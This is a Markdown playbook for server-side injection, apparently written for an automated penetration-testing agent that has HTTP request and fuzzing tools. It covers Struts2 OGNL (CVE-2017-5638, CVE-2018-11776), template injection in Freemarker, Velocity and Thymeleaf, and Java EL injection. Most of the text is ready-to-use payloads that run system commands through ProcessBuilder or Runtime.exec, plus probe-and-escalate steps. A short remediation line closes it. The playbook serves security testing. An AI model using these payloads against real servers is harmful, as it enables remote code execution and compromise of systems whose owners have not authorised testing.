# OGNL, SSTI & EL injection

Server-side expression/template injection → RCE. Probe with a math marker, then
escalate. Inject into params, body, JSON, and HEADERS via `http_request`/`http_fuzz`.

## Struts2 OGNL
- **S2-045 / S2-046 (CVE-2017-5638)**: malformed `Content-Type` header carrying an
  OGNL payload. `http_request` header `Content-Type:` =
  `%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).`
  `(#cmd='id').(#p=new java.lang.ProcessBuilder(#cmd)).(#p.start())...}`. Reflected
  command output ⇒ RCE.
- Older sinks: `redirect:${...}` / `action:${...}`, `?debug=command`, `%{7*7}` in
  `.action` params returning `49`.
- **S2-057 (CVE-2018-11776)**: distinct from S2-045 (Content-Type header) —
  when the action/namespace isn't hardcoded (`alwaysSelectFullNamespace`),
  OGNL evaluates inside the URL PATH itself. Request a namespace-like segment
  before an existing, un-namespaced `.action`:
  `/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').
  (#p=new java.lang.ProcessBuilder('/bin/bash','-c',#cmd).redirectErrorStream(true)).
  (#p.start())}/actionChain1.action`. Command output confirms — if you see it,
  it's S2-057, not S2-045 and not CVE-2023-50164 (upload path traversal).

## SSTI (Freemarker / Velocity / Thymeleaf)
Probe each input with `${7*7}`, `#{7*7}`, `*{7*7}`, `<#assign>`; `49` confirms.
- **Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
- **Velocity**: `#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod(...)...exec("id")`.
- **Thymeleaf**: `__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x` in a
  fragment / template name (SpEL preprocessing).

## EL / JSP-EL injection
`${...}` evaluated by the servlet container (JSP, Spring message). Probe `${7*7}`
→ `49`; escalate `${''.getClass().forName('java.lang.Runtime')...}` or
`${pageContext.request.getServletContext()...}`.

Sweep candidate inputs/payloads with `http_fuzz` (`match_regex:"49"` or the command
output); confirm one hit manually with `http_request`.

Evidence: the request + `49` / reflected command output.
Remediation: patch Struts (≥2.5.13); never put user input in OGNL/SpEL/EL or a
template name; use a sandboxed engine and pass data only as model attributes.
